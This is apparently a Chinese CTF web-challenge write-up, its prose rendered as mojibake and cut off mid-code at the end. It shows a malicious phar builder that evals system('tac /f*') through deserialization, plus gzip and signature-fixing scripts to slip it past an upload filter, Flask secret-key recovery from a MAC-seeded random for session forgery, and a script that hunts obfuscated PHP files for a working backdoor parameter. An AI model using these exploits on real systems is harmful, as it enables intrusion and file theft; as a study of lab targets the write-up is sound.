<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ä¸Šä¼ å¼‚å¸¸&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$allowedExts</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line">    <span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">    <span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>, <span class="variable">$allowedExts</span>)))&#123;</span><br><span class="line">        <span class="variable">$content</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">        <span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$content</span>, <span class="string">&quot;__HALT_COMPILER();&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">gettype</span>(<span class="variable">$pos</span>)===<span class="string">&quot;integer&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ltjä¸€çœ¼å°±å‘ç°äº†phar&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;./upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; æ–‡ä»¶å·²ç»å­˜åœ¨&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;./upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&quot;w&quot;</span>);</span><br><span class="line">                <span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$content</span>);</span><br><span class="line">                <span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;ä¸Šä¼ æˆåŠŸ ./upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;dkyä¸å–œæ¬¢è¿™ä¸ªæ–‡ä»¶ .&quot;</span>.<span class="variable">$extension</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å‘ç°å­˜åœ¨å¯¹__HALT_COMPILER();çš„æ£€æµ‹ã€‚å¯ä»¥ç”¨ä¸¤ç§æ–¹æ³•æ¥ç»•è¿‡</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222112240952.png" alt="image-20241222112240952"></p>
<p>æ¥å§ï¼Œå…ˆæ„é€ æ¶æ„pharæ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoveNss</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ljt</span>=<span class="string">&quot;Misc&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dky</span>=<span class="string">&quot;Re&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&quot;system(&#x27;tac /f*&#x27;);&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;ljt===<span class="string">&quot;Misc&quot;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;dky===<span class="string">&quot;Re&quot;</span>)</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ljt=<span class="string">&quot;Re&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dky=<span class="string">&quot;Misc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;test.phar&#x27;</span>);<span class="comment">//åˆ é™¤ä¹‹å‰çš„test.pharæ–‡ä»¶(å¦‚æœæœ‰)</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);<span class="comment">//åˆ›å»ºä¸€ä¸ªpharå¯¹è±¡ï¼Œæ–‡ä»¶åå¿…é¡»ä»¥pharä¸ºåç¼€</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();<span class="comment">//å¼€å§‹å†™æ–‡ä»¶</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);<span class="comment">//å†™å…¥stub</span></span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="title class_">LoveNss</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);<span class="comment">//å†™å…¥meta-data</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);<span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæ³¨æ„æ„é€ å®Œè¦ç”¨winhexæ”¹å±æ€§æ•°é‡ï¼</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gzip</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line"> f = file.read()</span><br><span class="line">newf = gzip.compress(f) <span class="comment">#å¯¹Pharâ½‚ä»¶è¿›â¾gzipå‹ç¼©</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;capoo.gif&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:<span class="comment">#æ›´æ”¹â½‚ä»¶åç¼€</span></span><br><span class="line"> file.write(newf)</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222112644143.png" alt="image-20241222112644143"></p>
<p>å°è¯•pharæ–‡ä»¶åŒ…å«ï¼Œä»–è¯´broken signatureï¼Œç­¾åæœ‰é—®é¢˜ï¼Ÿï¼</p>
<p>å½“æˆ‘ä»¬æ›´æ”¹test.pharæ–‡ä»¶çš„å†…å®¹æ—¶ï¼Œç­¾åä¼šå˜å¾—æ— æ•ˆï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ¢ä¸€ä¸ªç­¾åï¼</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222112807470.png" alt="image-20241222112807470"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    f = file.read()</span><br><span class="line">s = f[:-<span class="number">28</span>] <span class="comment"># è·å–è¦ç­¾åçš„æ•°æ®</span></span><br><span class="line">h = f[-<span class="number">8</span>:] <span class="comment"># è·å–ç­¾åç±»å‹å’ŒGBMBæ ‡è¯†</span></span><br><span class="line">newf = s + sha1(s).digest() + h <span class="comment"># æ•°æ® + ç­¾å + (ç±»å‹ + GBMB)</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;newtest.phar&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(newf) <span class="comment"># å†™å…¥æ–°æ–‡ä»¶</span></span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222113111949.png" alt="image-20241222113111949"></p>
<p>æ‹¿æäº†ï¼</p>
<h2 id="CISCN-2019åä¸œå—-Web4"><a href="#CISCN-2019åä¸œå—-Web4" class="headerlink" title="[CISCN 2019åä¸œå—]Web4"></a>[CISCN 2019åä¸œå—]Web4</h2><p>å¼€å±€å‘ç°ä»»æ„æ–‡ä»¶è¯»å–</p>
<p>pythonç½‘ç«™ï¼Œé‚£å°±ç›´æ¥è¯»æºç ã€‚</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222161153662.png" alt="image-20241222161153662"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> re, random, uuid, urllib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;www-data&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World! &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        m = re.findall(<span class="string">&#x27;^file.*&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">or</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No Hack&#x27;</span></span><br><span class="line">        res = urllib.urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">str</span>(ex)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;fuck&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag.txt&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Access denied&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">True</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure>

<p>æ€è·¯å°±æ˜¯æ”¹sessionã€‚</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222161704265.png" alt="image-20241222161704265"></p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222161718945.png" alt="image-20241222161718945" style="zoom:67%;" />

<p>æ¥ä¸‹æ¥å¦‚æœæˆ‘ä»¬èƒ½è·å–åˆ°secret_keyé‚£å°±å¤§åŠŸå‘Šæˆäº†ã€‚</p>
<p>ç„¶åæˆ‘å‘ç°äº†ä¸€ä¸ªè§£é¢˜å…³é”®ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br></pre></td></tr></table></figure>

<p>åªè¦æˆ‘ä»¬è·å–åˆ°uuid.getnode()ï¼Œé‚£ä¹ˆå°±çŸ¥é“ç§å­äº†ï¼Œå°±å¯ä»¥çŸ¥é“secret_keyäº†.</p>
<p>uuid.getnode()è¿”å›è®¡ç®—æœºçš„<strong>ç½‘ç»œæ¥å£å¡ï¼ˆNICï¼‰åœ°å€</strong>ï¼Œé€šå¸¸æ˜¯è®¾å¤‡çš„ MAC åœ°å€ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sys/class/net/eth0/address</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222162400463.png" alt="image-20241222162400463"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">02:42:ac:02:82:0a</span><br></pre></td></tr></table></figure>

<p>è¿™é“é¢˜å‰é¢å†™åˆ°è¿‡å•Šæˆ‘ä¸¢ï¼Œçªç„¶æ„è¯†åˆ°ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">random.seed(<span class="number">0x0242ac02820a</span>)</span><br><span class="line">sec=<span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br><span class="line"><span class="built_in">print</span>(sec)</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè¸©åˆ°å‘äº†ï¼Œpython2çš„ç¯å¢ƒï¼ï¼ï¼</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222164000955.png" alt="image-20241222164000955"></p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222163953824.png" alt="image-20241222163953824"></p>
<p>è¿™é‡Œä¸çŸ¥é“ä¸ºå•¥ä¸èƒ½ç”¨åŸæ¥çš„æ ¼å¼ï¼Œå¥‡æ€ª</p>
<h2 id="å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢"><a href="#å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢" class="headerlink" title="[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢"></a>[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢</h2><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223104912732.png" alt="image-20241223104912732"></p>
<p>ç»™äº†æºç </p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223104936822.png" alt="image-20241223104936822" style="zoom:80%;" />

<p>ä¸€å †æ··æ·†è¿‡çš„ä¸çŸ¥é“æ˜¯å•¥çš„æ–‡ä»¶ï¼Œè¶…çº§å¤šã€‚</p>
<p>æˆ‘ä»¬æ”¾dç›¾è·‘ä¸€ä¸‹</p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223105009974.png" alt="image-20241223105009974" style="zoom:80%;" />

<p>å‡ ä¹éƒ½æœ‰é—®é¢˜ï¼Œç›´æ¥éšä¾¿æ‰¾ä¸€ä¸ªè¯•è¯•ã€‚</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223105356197.png" alt="image-20241223105356197"></p>
<p>æ‰§è¡Œä¸äº†ï¼</p>
<p>é‚£å°±è·‘è·‘è„šæœ¬ï¼Œæ‰¾å‡ºèƒ½æ‰§è¡Œçš„ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;å¼€å§‹æ—¶é—´ï¼š &#x27;</span>+ time.asctime(time.localtime(time.time())))</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ§åˆ¶çº¿ç¨‹çš„æœ€å¤§æ•°é‡</span></span><br><span class="line">s1 = threading.Semaphore(<span class="number">100</span>)</span><br><span class="line">filePath=<span class="string">r&#x27;D:\newphpstudy\phpstudy_pro\WWW\src&#x27;</span></span><br><span class="line">os.chdir(filePath)</span><br><span class="line"><span class="comment">#è®¾ç½®é‡è¿æ¬¡æ•°ï¼Œé˜²æ­¢çº¿ç¨‹è¿‡é«˜ï¼Œæ–­å¼€è¿æ¥</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span></span><br><span class="line">files=os.listdir(filePath)</span><br><span class="line">session=requests.session()</span><br><span class="line"><span class="comment">#è®¾ç½®è¿æ¥çš„æ´»è·ƒçŠ¶æ€ä¸ºfalse</span></span><br><span class="line">session.keep_alive=<span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_content</span>(<span class="params">file</span>):</span><br><span class="line">    s1.acquire()</span><br><span class="line">    <span class="comment">#print(&#x27;tring  &#x27; + file + &#x27;   &#x27; + time.asctime(time.localtime(time.time())))</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file,encoding=<span class="string">&#x27;utf-8&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">        gets=<span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>,f.read()))</span><br><span class="line">        posts=<span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>,f.read()))</span><br><span class="line"></span><br><span class="line">    data=&#123;&#125;</span><br><span class="line">    params=&#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> gets:</span><br><span class="line">        params[i]=<span class="string">&quot;echo &#x27;123456&#x27;;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> posts:</span><br><span class="line">        data[j]=<span class="string">&quot;echo &#x27;123456&#x27;;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    target=<span class="string">&quot;http://127.0.0.1/src/&quot;</span>+file</span><br><span class="line"></span><br><span class="line">    <span class="comment">#print(target)</span></span><br><span class="line">    res=session.post(target,data=data,params=params)</span><br><span class="line">    <span class="comment">#print(res.text)</span></span><br><span class="line">    res.close()</span><br><span class="line">    res.encoding=<span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;123456&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> gets:</span><br><span class="line">            res=session.get(target+<span class="string">&#x27;?%s=&#x27;</span>%i+<span class="string">&quot;echo &#x27;123456&#x27;;&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;123456&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                flag=<span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag!=<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> posts:</span><br><span class="line">                res = session.post(target,data=&#123;j:<span class="string">&quot;echo &#x27;123456&#x27;;&quot;</span>&#125;)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;123456&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> flag==<span class="number">1</span>:</span><br><span class="line">            params=i</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            params=j</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;æ‰¾åˆ°äº†åˆ©ç”¨æ–‡ä»¶ï¼š &#x27;</span> + file + <span class="string">&quot;  and æ‰¾åˆ°äº†åˆ©ç”¨çš„å‚æ•°ï¼š%s&quot;</span> % params)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;ç»“æŸæ—¶é—´ï¼š &#x27;</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> files:</span><br><span class="line">    t=threading.Thread(target=get_content,args=(f,))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223113609841.png" alt="image-20241223113609841"></p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223113620325.png" alt="image-20241223113620325"></p>
<p>æ‹¿æäº†ï¼</p>
<h2 id="prize-p2"><a href="#prize-p2" class="headerlink" title="prize_p2"></a>prize_p2</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; randomBytes &#125; = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fp = <span class="string">&#x27;/app/src/flag.txt&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> flag = <span class="title class_">Buffer</span>(<span class="number">255</span>);</span><br><span class="line"><span class="keyword">const</span> a = fs.<span class="title function_">open</span>(fp, <span class="string">&#x27;r&#x27;</span>, <span class="function">(<span class="params">err, fd</span>) =&gt;</span> &#123;</span><br><span class="line">    fs.<span class="title function_">read</span>(fd, flag, <span class="number">0</span>, <span class="number">44</span>, <span class="number">0</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        fs.<span class="title function_">rm</span>(fp, <span class="function">() =&gt;</span> &#123;&#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span 